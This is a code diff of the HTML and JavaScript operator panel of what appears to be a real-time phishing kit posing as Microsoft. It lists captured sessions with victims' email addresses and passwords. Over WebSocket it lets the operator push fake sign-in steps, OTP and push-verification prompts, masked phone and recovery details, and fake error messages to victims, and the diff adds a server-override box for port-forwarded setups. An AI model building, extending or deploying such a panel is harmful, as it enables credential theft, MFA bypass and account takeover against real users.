@@ -1,125 +1,176 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>microsoft Admin — Realtime Sessions</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>microsoft — Admin</title>
   <style>
-    body { font-family: Inter, system-ui, Segoe UI, Arial; margin: 0; background: #f6f7fb; color: #111; min-height: 100vh; }
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
-    .topbar { background: #fff; border-bottom: 1px solid #e6e7ec; padding: 0 24px; height: 52px; display: flex; align-items: center; gap: 14px; position: sticky; top: 0; z-index: 10; }
-    .topbar-logo { font-weight: 700; font-size: 1rem; color: #111; }
-    .topbar-badge { font-size: 0.72rem; font-weight: 600; background: #f0f4ff; color: #4a6cf7; border: 1px solid #dbe4ff; border-radius: 99px; padding: 2px 10px; text-transform: uppercase; letter-spacing: 0.04em; }
-    .topbar-spacer { flex: 1; }
-    .ws-pill { display: flex; align-items: center; gap: 6px; font-size: 0.8rem; color: #888; background: #f6f7fb; border: 1px solid #e6e7ec; border-radius: 99px; padding: 4px 12px; }
-    .ws-dot { width: 7px; height: 7px; border-radius: 50%; background: #f87171; transition: background 0.2s; }
-    .ws-dot.on { background: #34d399; }
-
-    .page { max-width: 1100px; margin: 0 auto; padding: 20px; }
-    .gap { height: 14px; }
-
-    .stats-row { display: grid; grid-template-columns: repeat(3, 1fr); gap: 14px; margin-bottom: 14px; }
-    .stat-card { background: #fff; border: 1px solid #e6e7ec; border-radius: 8px; padding: 14px 18px; }
-    .stat-label { font-size: 0.75rem; color: #999; margin-bottom: 4px; text-transform: uppercase; letter-spacing: 0.05em; }
-    .stat-val { font-size: 1.4rem; font-weight: 700; color: #111; }
-    .stat-val.blue { color: #4a6cf7; }
-    .stat-val.green { color: #059669; }
-
-    .main-grid { display: grid; grid-template-columns: 1fr 360px; gap: 14px; align-items: start; }
-
-    .card { background: #fff; border: 1px solid #e6e7ec; border-radius: 8px; padding: 16px; }
-    .card h3 { margin: 0 0 14px; font-size: 0.92rem; font-weight: 600; color: #111; display: flex; align-items: center; gap: 8px; }
-    .card h3 .count { background: #f0f4ff; color: #4a6cf7; font-size: 0.72rem; border-radius: 99px; padding: 1px 8px; }
-
-    #sessionsList { display: flex; flex-direction: column; gap: 8px; max-height: 420px; overflow-y: auto; }
-    .session-card { border: 1px solid #e6e7ec; border-radius: 7px; padding: 12px 14px; cursor: pointer; transition: border-color 0.15s, background 0.15s; }
-    .session-card:hover { border-color: #c7d3ff; background: #fafbff; }
-    .session-card.selected { border-color: #4a6cf7; background: #f5f8ff; }
-    .session-top { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 5px; }
-    .session-id { font-size: 0.78rem; font-weight: 600; color: #4a6cf7; font-family: monospace; }
-    .session-time { font-size: 0.75rem; color: #bbb; }
-    .session-email { font-size: 0.875rem; font-weight: 500; margin-bottom: 3px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-    .session-password { font-size: 0.875rem; font-weight: 500; margin-bottom: 5px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-    .session-step { display: inline-block; font-size: 0.73rem; font-weight: 500; background: #f0f4ff; color: #4a6cf7; border: 1px solid #dbe4ff; border-radius: 99px; padding: 1px 9px; }
-    .session-btns { display: flex; gap: 6px; margin-top: 10px; flex-wrap: wrap; }
-    .mini-btn { font-family: inherit; font-size: 0.76rem; background: #f6f7fb; border: 1px solid #e6e7ec; color: #555; border-radius: 5px; padding: 4px 10px; cursor: pointer; transition: all 0.12s; }
-    .mini-btn:hover { background: #eef1fe; border-color: #c7d3ff; color: #4a6cf7; }
-    .empty { text-align: center; color: #bbb; font-size: 0.875rem; padding: 40px 0; }
-
-    .ctrl-label { font-size: 0.72rem; font-weight: 600; color: #888; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 5px; }
-    .ctrl-block { margin-bottom: 12px; }
-
-    .fields-section { border: 1px solid #e6e7ec; border-radius: 7px; padding: 10px 12px; margin-bottom: 12px; background: #fafbff; }
-    .fields-section-title { font-size: 0.72rem; font-weight: 700; color: #4a6cf7; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 10px; display: flex; align-items: center; gap: 6px; }
-    .fields-section-title .dot { width: 5px; height: 5px; border-radius: 50%; background: #4a6cf7; }
-
-    /* Error section — special red tint */
-    .error-section { border: 1px solid #fecaca; border-radius: 7px; padding: 10px 12px; margin-bottom: 12px; background: #fff5f5; }
-    .error-section-title { font-size: 0.72rem; font-weight: 700; color: #dc2626; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 10px; display: flex; align-items: center; gap: 6px; }
-    .error-section-title .dot { width: 5px; height: 5px; border-radius: 50%; background: #dc2626; }
-
-    .step-banner { display: flex; align-items: center; gap: 8px; background: #f0f4ff; border: 1px solid #dbe4ff; border-radius: 7px; padding: 8px 12px; margin-bottom: 12px; }
-    .step-banner-label { font-size: 0.72rem; color: #888; }
-    .step-banner-name { font-size: 0.875rem; font-weight: 700; color: #4a6cf7; font-family: monospace; }
-
-    input.ctrl-input, select.ctrl-input {
-      width: 100%; padding: 8px 10px; border: 1px solid #dde1ea; border-radius: 6px;
-      font-size: 0.84rem; font-family: inherit; color: #111; background: #fff;
-      outline: none; box-sizing: border-box; transition: border-color 0.15s;
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #f4f4f2;
+      color: #111;
+      min-height: 100vh;
     }
-    input.ctrl-input:focus, select.ctrl-input:focus { border-color: #4a6cf7; box-shadow: 0 0 0 3px rgba(74,108,247,0.08); }
-    select.err-select { border-color: #fca5a5; }
-    select.err-select:focus { border-color: #dc2626; box-shadow: 0 0 0 3px rgba(220,38,38,0.08); }
 
-    /* custom error text field — shows when "Custom…" is chosen */
-    .custom-error-row { margin-top: 6px; display: none; }
-    .custom-error-row.show { display: block; }
+    .topbar {
+      background: #fff;
+      border-bottom: 2px solid #0078d4;
+      padding: 0 28px;
+      height: 54px;
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      position: sticky;
+      top: 0;
+      z-index: 20;
+    }
+    .topbar-logo { font-size: 1.15rem; font-weight: bold; color: #0078d4; }
+    .topbar-sep  { color: #ddd; font-size: 1.2rem; }
+    .topbar-title { font-size: 0.92rem; color: #555; }
+    .topbar-spacer { flex: 1; }
+    .ws-pill {
+      display: flex; align-items: center; gap: 7px;
+      font-size: 0.8rem; color: #888;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #f4f4f2; border: 1px solid #ddd;
+      border-radius: 2px; padding: 4px 12px;
+    }
+    .ws-dot { width: 8px; height: 8px; border-radius: 50%; background: #e53935; transition: background 0.25s; }
+    .ws-dot.on { background: #43a047; }
+
+    .page { max-width: 1120px; margin: 0 auto; padding: 22px; }
+
+    .stats-row { display: grid; grid-template-columns: repeat(3,1fr); gap: 14px; margin-bottom: 18px; }
+    .stat-card  { background: #fff; border: 1px solid #ddd; padding: 14px 18px; }
+    .stat-label { font-size: 0.7rem; color: #999; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-transform: uppercase; letter-spacing: 0.07em; margin-bottom: 4px; }
+    .stat-val   { font-size: 1.5rem; font-weight: bold; color: #0078d4; }
+    .stat-val.dark { color: #111; }
+
+    .main-grid { display: grid; grid-template-columns: 1fr 370px; gap: 14px; align-items: start; }
+
+    .card { background: #fff; border: 1px solid #ddd; padding: 18px; }
+    .card-title {
+      font-size: 0.95rem; font-weight: bold; color: #111;
+      border-bottom: 1px solid #eee; padding-bottom: 10px; margin-bottom: 14px;
+      display: flex; align-items: center; gap: 10px;
+    }
+    .card-title .count {
+      font-size: 0.72rem; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #e8f0fb; color: #0078d4;
+      border: 1px solid #b3cdf7; padding: 1px 8px; border-radius: 2px;
+    }
+
+    #sessionsList { display: flex; flex-direction: column; gap: 10px; max-height: 440px; overflow-y: auto; }
+    .session-card { border: 1px solid #ddd; padding: 12px 14px; cursor: pointer; transition: border-color 0.15s, background 0.15s; }
+    .session-card:hover { border-color: #0078d4; background: #f0f6fd; }
+    .session-card.selected { border-color: #0078d4; border-left: 3px solid #0078d4; background: #e8f0fb; }
+    .sess-top { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 5px; }
+    .sess-id { font-size: 0.75rem; color: #0078d4; font-family: monospace; font-weight: bold; }
+    .sess-time { font-size: 0.72rem; color: #bbb; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+    .sess-email, .sess-password { font-size: 0.85rem; margin-bottom: 3px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .sess-step { display: inline-block; font-size: 0.7rem; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #e8f0fb; color: #0078d4; border: 1px solid #b3cdf7; padding: 1px 8px; margin-top: 4px; }
+    .sess-btns { display: flex; gap: 6px; margin-top: 8px; flex-wrap: wrap; }
+    .mini-btn { font-family: Georgia,serif; font-size: 0.73rem; background: #f4f4f2; border: 1px solid #ccc; color: #333; padding: 3px 9px; cursor: pointer; transition: all 0.12s; }
+    .mini-btn:hover { background: #e8f0fb; border-color: #0078d4; color: #0078d4; }
+    .empty-msg { text-align: center; color: #bbb; font-size: 0.85rem; padding: 40px 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+
+    .ctrl-block { margin-bottom: 14px; }
+    .ctrl-label { font-size: 0.7rem; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight: bold; color: #777; text-transform: uppercase; letter-spacing: 0.06em; margin-bottom: 5px; }
+
+    .ctrl-input {
+      width: 100%; padding: 8px 10px;
+      border: 1px solid #ccc; border-bottom: 2px solid #aaa;
+      font-size: 0.875rem; font-family: Georgia, serif;
+      color: #111; background: #fff; outline: none;
+      box-sizing: border-box; transition: border-bottom-color 0.15s;
+    }
+    .ctrl-input:focus { border-bottom-color: #0078d4; }
+    .ctrl-input[readonly] { background: #f9f9f9; color: #888; }
+    select.ctrl-input { cursor: pointer; }
 
     .field-row { position: relative; }
-    .field-clear { position: absolute; right: 6px; top: 50%; transform: translateY(-50%); font-size: 0.72rem; color: #ccc; cursor: pointer; background: none; border: none; line-height: 1; padding: 2px 4px; border-radius: 3px; font-family: inherit; }
-    .field-clear:hover { color: #f87171; }
-    .field-row input { padding-right: 24px; }
+    .field-clear { position: absolute; right: 6px; top: 50%; transform: translateY(-50%); font-size: 0.7rem; color: #ccc; cursor: pointer; background: none; border: none; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1; padding: 2px 4px; }
+    .field-clear:hover { color: #e53935; }
+    .field-row .ctrl-input { padding-right: 24px; }
+
+    .preview-pill {
+      display: inline-block;
+      font-size: 0.75rem;
+      font-family: Georgia, serif;
+      color: #0078d4;
+      background: #e8f0fb;
+      border: 1px solid #b3cdf7;
+      padding: 3px 10px;
+      margin-top: 5px;
+    }
+    .preview-pill:empty { display: none; }
+
+    .fields-section { border: 1px solid #ddd; padding: 10px 12px; margin-bottom: 12px; background: #fafaf9; }
+    .fields-section-title { font-size: 0.68rem; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight: bold; color: #0078d4; text-transform: uppercase; letter-spacing: 0.07em; margin-bottom: 10px; display: flex; align-items: center; gap: 6px; }
+    .fields-section-title .dot { width: 5px; height: 5px; background: #0078d4; flex-shrink: 0; }
+
+    .error-section { border: 1px solid #f5c6c6; padding: 10px 12px; margin-bottom: 12px; background: #fff8f8; }
+    .error-section-title { font-size: 0.68rem; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight: bold; color: #c50f1f; text-transform: uppercase; letter-spacing: 0.07em; margin-bottom: 10px; display: flex; align-items: center; gap: 6px; }
+    .error-section-title .dot { width: 5px; height: 5px; background: #c50f1f; flex-shrink: 0; }
+
+    select.err-select { border-bottom-color: #f5a5a5; }
+    select.err-select:focus { border-bottom-color: #c50f1f; }
+    .custom-error-row { display: none; margin-top: 8px; }
+    .custom-error-row.show { display: block; }
+    .field-hint { font-size: 0.68rem; color: #bbb; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin-top: 4px; }
+
+    .step-banner { background: #e8f0fb; border-left: 3px solid #0078d4; padding: 8px 12px; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
+    .step-banner-label { font-size: 0.72rem; color: #555; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+    .step-banner-name  { font-size: 0.875rem; font-weight: bold; color: #0078d4; font-family: monospace; }
 
     .action-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
-    .act-btn { font-family: inherit; font-size: 0.84rem; font-weight: 500; padding: 9px 12px; border-radius: 7px; cursor: pointer; border: 1px solid #e6e7ec; background: #f6f7fb; color: #333; transition: all 0.14s; text-align: center; }
-    .act-btn:hover { background: #eef1fe; border-color: #c7d3ff; color: #4a6cf7; }
-    .act-btn.primary { background: #4a6cf7; color: #fff; border-color: #4a6cf7; grid-column: 1 / -1; }
-    .act-btn.primary:hover { background: #3558e8; }
-    .act-btn.secondary { background: #f0fdf4; color: #059669; border-color: #bbf7d0; grid-column: 1 / -1; }
-    .act-btn.secondary:hover { background: #dcfce7; }
-    .act-btn.danger { background: #fef2f2; color: #dc2626; border-color: #fecaca; grid-column: 1 / -1; }
-    .act-btn.danger:hover { background: #fee2e2; }
-    .act-btn.load-btn { background: #f0f4ff; color: #4a6cf7; border-color: #dbe4ff; grid-column: 1 / -1; margin-top: 2px; }
-    .act-btn.load-btn:hover { background: #dbe4ff; }
+    .act-btn { font-family: Georgia, serif; font-size: 0.84rem; padding: 9px 12px; border: 1px solid #ccc; background: #f4f4f2; color: #333; cursor: pointer; transition: all 0.13s; text-align: center; }
+    .act-btn:hover { background: #e8f0fb; border-color: #0078d4; color: #0078d4; }
+    .act-btn.primary   { background: #0078d4; color: #fff; border-color: #0078d4; grid-column: 1 / -1; }
+    .act-btn.primary:hover { background: #006cbe; }
+    .act-btn.secondary { background: #e8f5e9; color: #2e7d32; border-color: #a5d6a7; grid-column: 1 / -1; }
+    .act-btn.secondary:hover { background: #c8e6c9; }
+    .act-btn.danger    { background: #fff8f8; color: #c50f1f; border-color: #f5c6c6; grid-column: 1 / -1; }
+    .act-btn.danger:hover { background: #fde8e8; }
+    .act-btn.load-btn  { background: #e8f0fb; color: #0078d4; border-color: #b3cdf7; grid-column: 1 / -1; margin-top: 2px; }
+    .act-btn.load-btn:hover { background: #d0e4f7; }
 
-    .field-hint { font-size: 0.71rem; color: #bbb; margin-top: 3px; }
+    /* ── Connection override box ── */
+    .conn-box { background: #fffbea; border: 1px solid #f0c040; padding: 10px 12px; margin-bottom: 14px; font-size: 0.78rem; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: #555; }
+    .conn-box strong { color: #b45309; }
+    .conn-row { display: flex; gap: 6px; margin-top: 6px; }
+    .conn-row input { flex: 1; padding: 5px 8px; border: 1px solid #ccc; border-bottom: 2px solid #aaa; font-size: 0.8rem; font-family: Georgia,serif; outline: none; }
+    .conn-row input:focus { border-bottom-color: #0078d4; }
+    .conn-row button { padding: 5px 12px; font-size: 0.8rem; font-family: Georgia,serif; background: #0078d4; color: #fff; border: none; cursor: pointer; }
+    .conn-row button:hover { background: #006cbe; }
 
-    hr { border: none; border-top: 1px solid #f0f0f3; margin: 12px 0; }
+    hr.div { border: none; border-top: 1px solid #eee; margin: 12px 0; }
 
-    #logs { max-height: 180px; overflow-y: auto; font-size: 0.78rem; font-family: monospace; color: #555; line-height: 1.8; }
-    .log-ts { color: #ccc; }
-    .log-admin { color: #4a6cf7; }
-    .log-server { color: #d97706; }
-    .log-client { color: #059669; }
-    .log-err { color: #dc2626; }
+    #logs { max-height: 190px; overflow-y: auto; font-size: 0.76rem; font-family: monospace; color: #555; line-height: 1.9; }
+    .log-ts     { color: #ccc; }
+    .log-admin  { color: #0078d4; }
+    .log-server { color: #b45309; }
+    .log-client { color: #2e7d32; }
+    .log-err    { color: #c50f1f; }
 
-    #phaseModal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.4); z-index: 100; align-items: center; justify-content: center; }
+    #phaseModal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.35); z-index: 100; align-items: center; justify-content: center; }
     #phaseModal.open { display: flex; }
-    #phaseModalBox { background: #fff; border-radius: 10px; padding: 20px; max-width: 540px; width: 90%; max-height: 80vh; overflow-y: auto; box-shadow: 0 8px 40px rgba(0,0,0,0.18); }
-    #phaseModalBox h4 { margin: 0 0 4px; font-size: 0.95rem; color: #111; }
-    #phaseModalBox .modal-sub { font-size: 0.78rem; color: #999; margin: 0 0 14px; }
+    #phaseModalBox { background: #fff; border: 1px solid #ccc; padding: 24px; max-width: 500px; width: 90%; max-height: 80vh; overflow-y: auto; box-shadow: 0 8px 40px rgba(0,0,0,0.15); }
+    #phaseModalBox h4 { font-size: 1rem; margin-bottom: 4px; }
+    #phaseModalBox .modal-sub { font-size: 0.78rem; color: #999; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin-bottom: 16px; }
     #phaseList { display: flex; flex-direction: column; gap: 8px; }
-    .phase-item { border: 1px solid #e6e7ec; border-radius: 7px; padding: 12px 14px; cursor: pointer; transition: border-color 0.15s, background 0.15s; }
-    .phase-item:hover { border-color: #4a6cf7; background: #f5f8ff; }
-    .phase-item-name { font-size: 0.78rem; font-weight: 700; color: #4a6cf7; font-family: monospace; margin-bottom: 4px; }
-    .phase-item-title { font-size: 0.875rem; font-weight: 600; color: #111; margin-bottom: 2px; }
-    .phase-item-sub { font-size: 0.78rem; color: #888; }
-    #phaseModalClose { margin-top: 14px; font-family: inherit; font-size: 0.84rem; padding: 8px 18px; border-radius: 7px; border: 1px solid #e6e7ec; background: #f6f7fb; color: #555; cursor: pointer; }
-    #phaseModalClose:hover { background: #eef1fe; color: #4a6cf7; }
+    .phase-item { border: 1px solid #ddd; padding: 12px 14px; cursor: pointer; transition: border-color 0.15s, background 0.15s; }
+    .phase-item:hover { border-color: #0078d4; background: #f0f6fd; }
+    .phase-item-name  { font-size: 0.75rem; font-family: monospace; color: #0078d4; font-weight: bold; margin-bottom: 3px; }
+    .phase-item-title { font-size: 0.875rem; font-weight: bold; color: #111; margin-bottom: 2px; }
+    .phase-item-sub   { font-size: 0.78rem; color: #888; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+    #phaseModalClose { margin-top: 14px; font-family: Georgia,serif; font-size: 0.84rem; padding: 7px 18px; border: 1px solid #ccc; background: #f4f4f2; color: #555; cursor: pointer; }
+    #phaseModalClose:hover { background: #e8f0fb; color: #0078d4; }
 
     ::-webkit-scrollbar { width: 4px; }
-    ::-webkit-scrollbar-track { background: transparent; }
-    ::-webkit-scrollbar-thumb { background: #e6e7ec; border-radius: 99px; }
+    ::-webkit-scrollbar-thumb { background: #ddd; }
   </style>
 </head>
 <body>
@@ -127,16 +178,17 @@
 <div id="phaseModal">
   <div id="phaseModalBox">
     <h4>Select a step to load</h4>
-    <p class="modal-sub">Loads the step's current text into the editor. Edit freely then push.</p>
+    <p class="modal-sub">Loads the step's current text into the editor. Edit freely, then push.</p>
     <div id="phaseList"></div>
-    <br/>
+    <br>
     <button id="phaseModalClose">Close</button>
   </div>
 </div>
 
 <div class="topbar">
   <div class="topbar-logo">microsoft</div>
-  <div class="topbar-badge">Admin</div>
+  <div class="topbar-sep">/</div>
+  <div class="topbar-title">Admin Panel</div>
   <div class="topbar-spacer"></div>
   <div class="ws-pill">
     <div class="ws-dot" id="wsDot"></div>
@@ -145,26 +197,39 @@
 </div>
 
 <div class="page">
+
   <div class="stats-row">
-    <div class="stat-card"><div class="stat-label">Active Sessions</div><div class="stat-val green" id="stat-sessions">0</div></div>
-    <div class="stat-card"><div class="stat-label">Events Received</div><div class="stat-val blue" id="stat-events">0</div></div>
-    <div class="stat-card"><div class="stat-label">Selected Session</div><div class="stat-val" style="font-size:0.85rem;padding-top:4px" id="stat-selected">—</div></div>
+    <div class="stat-card"><div class="stat-label">Active Sessions</div><div class="stat-val" id="stat-sessions">0</div></div>
+    <div class="stat-card"><div class="stat-label">Events Received</div><div class="stat-val" id="stat-events">0</div></div>
+    <div class="stat-card"><div class="stat-label">Selected</div><div class="stat-val dark" style="font-size:0.85rem;padding-top:5px" id="stat-selected">—</div></div>
   </div>
 
   <div class="main-grid">
 
     <div class="card">
-      <h3>Active Sessions <span class="count" id="session-count">0</span></h3>
-      <div id="sessionsList"><div class="empty">No sessions yet — waiting for clients to connect.</div></div>
+      <div class="card-title">Active Sessions <span class="count" id="session-count">0</span></div>
+      <div id="sessionsList"><div class="empty-msg">No sessions yet — waiting for clients to connect.</div></div>
     </div>
 
     <div>
-      <div class="card" style="max-height:86vh;overflow-y:auto;">
-        <h3>Actions</h3>
+      <div class="card" style="max-height:88vh;overflow-y:auto;">
+        <div class="card-title">Session Control</div>
+
+        <!-- ── Server URL override (for cross-origin / port-forward use) ── -->
+        <div class="conn-box">
+          <strong>WebSocket Server</strong><br>
+          When admin and client are on different origins (e.g. port-forwarded),
+          enter the server's public WS URL below and click Reconnect.
+          Leave blank to auto-detect (same origin).
+          <div class="conn-row">
+            <input id="wsOverride" placeholder="wss://your-server.example.com  or  ws://1.2.3.4:3000" />
+            <button onclick="reconnectWS()">Reconnect</button>
+          </div>
+        </div>
 
         <div class="ctrl-block">
           <div class="ctrl-label">Session ID</div>
-          <input class="ctrl-input" id="targetSession" placeholder="Click a session to select" readonly />
+          <input class="ctrl-input" id="targetSession" readonly placeholder="Click a session to select" />
         </div>
 
         <div class="ctrl-block">
@@ -173,34 +238,32 @@
             <option value="email">email</option>
             <option value="password">password</option>
             <option value="verify">verify (push)</option>
-            <option value="phone">phone</option>
+            <option value="phone">phone (confirm)</option>
             <option value="code">code (OTP)</option>
             <option value="recovery">recovery</option>
             <option value="security">security</option>
           </select>
         </div>
 
-        <hr/>
+        <hr class="div">
 
         <div class="step-banner">
           <div class="step-banner-label">Editing step</div>
           <div class="step-banner-name" id="stepBannerName">email</div>
         </div>
 
-        <!-- Common fields -->
+        <!-- Common content -->
         <div class="fields-section">
           <div class="fields-section-title"><span class="dot"></span> Content</div>
-
           <div class="ctrl-block">
-            <div class="ctrl-label">Title (h2)</div>
+            <div class="ctrl-label">Title (h1)</div>
             <div class="field-row">
               <input class="ctrl-input" id="field-title" placeholder="Leave blank to keep existing" />
               <button class="field-clear" onclick="clearField('field-title')">✕</button>
             </div>
           </div>
-
           <div class="ctrl-block" style="margin-bottom:0">
-            <div class="ctrl-label">Subtitle</div>
+            <div class="ctrl-label">Subtitle / description</div>
             <div class="field-row">
               <input class="ctrl-input" id="field-subtitle" placeholder="Leave blank to keep existing" />
               <button class="field-clear" onclick="clearField('field-subtitle')">✕</button>
@@ -208,7 +271,7 @@
           </div>
         </div>
 
-        <!-- Verify extras -->
+        <!-- Verify extra -->
         <div class="fields-section step-extra" id="extra-verify" style="display:none">
           <div class="fields-section-title"><span class="dot"></span> Verify step</div>
           <div class="ctrl-block" style="margin-bottom:0">
@@ -220,57 +283,53 @@
           </div>
         </div>
 
-        <!-- Phone extras -->
+        <!-- Phone extra -->
         <div class="fields-section step-extra" id="extra-phone" style="display:none">
           <div class="fields-section-title"><span class="dot"></span> Phone step</div>
-          <div class="ctrl-block">
-            <div class="ctrl-label">Info label</div>
-            <div class="field-row">
-              <input class="ctrl-input" id="field-phoneInfoLabel" placeholder="Phone number on your account" />
-              <button class="field-clear" onclick="clearField('field-phoneInfoLabel')">✕</button>
-            </div>
+          <div style="border:1px solid #d0d0d0;padding:9px 11px;background:#fafafa;margin-bottom:12px;font-family:Georgia,serif;">
+            <div style="font-size:10px;color:#888;text-transform:uppercase;letter-spacing:0.04em;margin-bottom:3px;">Phone number on your account</div>
+            <div style="font-size:13px;color:#111;" id="phone-preview">(•••) ••••-••49</div>
           </div>
           <div class="ctrl-block" style="margin-bottom:0">
-            <div class="ctrl-label">Masked number</div>
+            <div class="ctrl-label">Last digits of phone number</div>
             <div class="field-row">
-              <input class="ctrl-input" id="field-phoneInfoValue" placeholder="(•••) ••••-••49" />
-              <button class="field-clear" onclick="clearField('field-phoneInfoValue')">✕</button>
+              <input class="ctrl-input" id="field-phoneNumber"
+                placeholder="e.g. 49 → (•••) ••••-••49"
+                oninput="updatePhonePreview()" />
+              <button class="field-clear" onclick="clearField('field-phoneNumber');updatePhonePreview()">✕</button>
             </div>
+            <div class="field-hint">Type the last 1–4 digits. The rest will be masked automatically.</div>
           </div>
         </div>
 
-        <!-- Recovery extras -->
+        <!-- Recovery extra -->
         <div class="fields-section step-extra" id="extra-recovery" style="display:none">
           <div class="fields-section-title"><span class="dot"></span> Recovery step</div>
-          <div class="ctrl-block">
-            <div class="ctrl-label">Info label</div>
-            <div class="field-row">
-              <input class="ctrl-input" id="field-recoveryInfoLabel" placeholder="Recovery email on your account" />
-              <button class="field-clear" onclick="clearField('field-recoveryInfoLabel')">✕</button>
-            </div>
+          <div style="border:1px solid #d0d0d0;padding:9px 11px;background:#fafafa;margin-bottom:12px;font-family:Georgia,serif;">
+            <div style="font-size:10px;color:#888;text-transform:uppercase;letter-spacing:0.04em;margin-bottom:3px;">Recovery email on your account</div>
+            <div style="font-size:13px;color:#111;" id="recovery-preview">reu•••••••@gmail.com</div>
           </div>
           <div class="ctrl-block" style="margin-bottom:0">
-            <div class="ctrl-label">Masked email</div>
+            <div class="ctrl-label">Recovery email (masked)</div>
             <div class="field-row">
-              <input class="ctrl-input" id="field-recoveryInfoValue" placeholder="reu•••••••@gmail.com" />
-              <button class="field-clear" onclick="clearField('field-recoveryInfoValue')">✕</button>
+              <input class="ctrl-input" id="field-recoveryEmail"
+                placeholder="e.g. gmail.com → usr•••••••@gmail.com"
+                oninput="updateRecoveryPreview()" />
+              <button class="field-clear" onclick="clearField('field-recoveryEmail');updateRecoveryPreview()">✕</button>
             </div>
+            <div class="field-hint">Type the domain (e.g. gmail.com) or the full masked email.</div>
           </div>
         </div>
 
-        <!-- ── ERROR SECTION ── -->
+        <!-- Error section -->
         <div class="error-section">
           <div class="error-section-title"><span class="dot"></span> Error message</div>
-
           <div class="ctrl-block">
             <div class="ctrl-label">Select error</div>
             <select class="ctrl-input err-select" id="field-errorSelect" onchange="onErrorSelectChange()">
               <option value="">— no error —</option>
-              <!-- populated per step by onStepChange() -->
             </select>
           </div>
-
-          <!-- Custom error input — shown only when "Custom…" is selected -->
           <div class="custom-error-row" id="customErrorRow">
             <div class="ctrl-label">Custom error text</div>
             <div class="field-row">
@@ -278,16 +337,11 @@
               <button class="field-clear" onclick="clearField('field-errorCustom')">✕</button>
             </div>
           </div>
-
-          <div class="field-hint" style="margin-top:6px;">Shows the red error and un-freezes the form on the client.</div>
-
-          <!-- Dedicated Send Error button -->
+          <div class="field-hint" style="margin-top:6px;">Hides the dots loader and shows the error on the client.</div>
           <button class="act-btn danger" id="btnSendError" style="margin-top:10px;width:100%">⚠ Send Error</button>
         </div>
 
-        <hr/>
-
-        <div id="previewBox" style="display:none;background:#fafbff;border:1px dashed #dbe4ff;border-radius:6px;padding:9px 12px;margin-bottom:12px;font-size:0.75rem;font-family:monospace;color:#555;white-space:pre-wrap;word-break:break-all;"></div>
+        <hr class="div">
 
         <div class="action-grid">
           <button class="act-btn secondary" id="btnUpdate">✎ Update Content</button>
@@ -298,30 +352,50 @@
         </div>
       </div>
 
-      <div class="gap"></div>
+      <div style="height:14px"></div>
 
       <div class="card">
-        <h3>Logs</h3>
-        <div id="logs"><span style="color:#ddd">— waiting for events —</span></div>
+        <div class="card-title">Event Log</div>
+        <div id="logs"><span style="color:#ddd;font-family:Arial,sans-serif;font-size:0.78rem;">— waiting for events —</span></div>
       </div>
     </div>
 
   </div>
 </div>
 
-<!-- ═══════════════════════ WEBSOCKET ═══════════════════════ -->
+<!-- ══════════════════ WEBSOCKET ══════════════════ -->
 <script>
-  const wsUrl = (location.protocol === 'https:' ? 'wss://' : 'ws://') +
-    (window.location.hostname || 'localhost') +
-    (location.port ? ':' + location.port : ':3000');
+  // Build the default WS URL from the current page origin (same-origin).
+  // If admin is on a different host, the input box above lets them override it.
+  function buildDefaultWsUrl() {
+    const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+    const host  = location.hostname || 'localhost';
+    const port  = location.port ? ':' + location.port : '';
+    return proto + '//' + host + port;
+  }
 
+  let wsUrl = buildDefaultWsUrl();
   let socket = null, sessions = {}, selectedSession = null, eventCount = 0;
+
+  // Allow the admin to point at a different server (cross-origin port-forward case)
+  function reconnectWS() {
+    const override = document.getElementById('wsOverride').value.trim();
+    if (override) {
+      wsUrl = override;
+      log('using override URL: ' + wsUrl, 'admin');
+    } else {
+      wsUrl = buildDefaultWsUrl();
+      log('using auto URL: ' + wsUrl, 'admin');
+    }
+    if (socket) { try { socket.close(); } catch(_) {} }
+    init();
+  }
 
   function log(msg, type = 'admin') {
     const el  = document.getElementById('logs');
     const ts  = new Date().toLocaleTimeString([], {hour:'2-digit',minute:'2-digit',second:'2-digit'});
     const cls = {admin:'log-admin',server:'log-server',client:'log-client',err:'log-err'}[type]||'log-admin';
-    const tag = {admin:'ADMIN',server:'SERVER',client:'CLIENT',err:'ERROR'}[type]||'ADMIN';
+    const tag = {admin:'ADMIN',server:'SERVER',client:'CLIENT',err:'ERROR'}[type]||type.toUpperCase();
